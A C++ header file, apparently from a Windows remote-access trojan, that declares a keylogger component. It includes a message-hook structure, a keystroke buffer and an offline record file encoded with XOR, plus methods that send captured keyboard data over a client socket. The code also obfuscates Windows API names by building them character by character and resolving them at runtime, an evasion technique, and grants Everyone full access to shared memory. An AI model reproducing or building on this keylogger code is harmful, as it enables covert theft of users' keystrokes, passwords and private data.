// KeyboardManager.h: interface for the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
#define AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "../Declare.h"   //��̬���ÿ⺯��
#include "Manager.h"

#define	SIZE_IMM_BUFFER					128
#define XOR_ENCODE_VALUE				98	// ���̼�¼���ܵ�xorֵ

typedef	struct
{
	DWORD	dwOffset;
	HHOOK	hGetMsgHook;
	HWND	hActWnd;	//current actived window
	bool	bIsOffline;
	char	strRecordFile[MAX_PATH];
	char	chKeyBoard[1024];
	char	str[SIZE_IMM_BUFFER];
}TShared;


class CShareRestrictedSD  
{
public:
	CShareRestrictedSD()
	{
		ptr = NULL;
		sa.nLength = sizeof(sa);
		sa.lpSecurityDescriptor = &sd;
		sa.bInheritHandle = FALSE;
		// build a restricted security descriptor
		ptr = BuildRestrictedSD(&sd);
	}

	virtual ~CShareRestrictedSD()
	{
		if (ptr)
			FreeRestrictedSD(ptr);
	}

	LPVOID BuildRestrictedSD(PSECURITY_DESCRIPTOR pSD) 
	{
		
		DWORD  dwAclLength;
		PSID   psidEveryone = NULL;
		PACL   pDACL = NULL;
		BOOL   bResult = FALSE;
		PACCESS_ALLOWED_ACE pACE = NULL;
		SID_IDENTIFIER_AUTHORITY siaWorld = SECURITY_WORLD_SID_AUTHORITY  ;
		SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
		
		__try {
			
			// initialize the security descriptor
			if (!InitializeSecurityDescriptor(pSD, 
				SECURITY_DESCRIPTOR_REVISION)) {
				__leave;
			}
			
			// obtain a sid for the Authenticated Users Group
			if (!AllocateAndInitializeSid(&siaWorld, 1, 
				SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, 
				&psidEveryone)) {
				__leave;
			}
			
			// NOTE:
			// 
			// The Authenticated Users group includes all user accounts that
			// have been successfully authenticated by the system. If access
			// must be restricted to a specific user or group other than 
			// Authenticated Users, the SID can be constructed using the
			// LookupAccountSid() API based on a user or group name.
			
			// calculate the DACL length
			dwAclLength = sizeof(ACL)
				// add space for Authenticated Users group ACE
				+ sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD)
				+ GetLengthSid(psidEveryone);
			
			// allocate memory for the DACL
			char JwFNw02[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};
	        GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw02);
			char JwFNw03[] = {'H','e','a','p','A','l','l','o','c','\0'};
			HeapAllocT pHeapAlloc=(HeapAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw03);
			pDACL = (PACL) pHeapAlloc(pGetProcessHeap(), HEAP_ZERO_MEMORY, 
				dwAclLength);
			if (!pDACL) {
				__leave;
			}
			
			// initialize the DACL
			if (!InitializeAcl(pDACL, dwAclLength, ACL_REVISION)) {
				__leave;
			}
			
			// add the Authenticated Users group ACE to the DACL with
			// GENERIC_READ, GENERIC_WRITE, and GENERIC_EXECUTE access
			if (!AddAccessAllowedAce(pDACL, ACL_REVISION,
				GENERIC_ALL,
				psidEveryone)) {
				__leave;
			}
			// set the DACL in the security descriptor
			if (!SetSecurityDescriptorDacl(pSD, TRUE, pDACL, FALSE)) {
				__leave;
			}
			
			bResult = TRUE;
			
		} 
		__finally {
			if (psidEveryone) FreeSid(psidEveryone);
		}
		char JwFNw02[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};
	    GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw02);
		char JwFNw05[] = {'H','e','a','p','F','r','e','e','\0'};
	    HeapFreeT pHeapFree=(HeapFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw05);
		if (bResult == FALSE) {
			if (pDACL) pHeapFree(pGetProcessHeap(), 0, pDACL);
			pDACL = NULL;
		}
		
		return (LPVOID) pDACL;
	}

	// The following function frees memory allocated in the
	// BuildRestrictedSD() function

	VOID FreeRestrictedSD(LPVOID ptr) 
	{
		char JwFNw02[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};
	    GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw02);
		char JwFNw05[] = {'H','e','a','p','F','r','e','e','\0'};
	    HeapFreeT pHeapFree=(HeapFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw05);
		if (ptr) pHeapFree(pGetProcessHeap(), 0, ptr);
	}

	SECURITY_ATTRIBUTES* GetSA()
	{
		if (ptr)
			return &sa;
		else
			return NULL;
	}

protected:
	LPVOID ptr;
	SECURITY_ATTRIBUTES sa;
	SECURITY_DESCRIPTOR sd;
};
class CKeyboardManager : public CManager  
{
public:
	static HINSTANCE g_hInstance;
	CKeyboardManager(CClientSocket *pClient);
	virtual ~CKeyboardManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	static LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam);
	static void SaveInfo(char *lpBuffer);
	static void SaveToFile(char *lpBuffer);
	int sendOfflineRecord();
	int sendKeyBoardData(LPBYTE lpData, UINT nSize);
	int sendStartKeyBoard();
};

#endif // !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
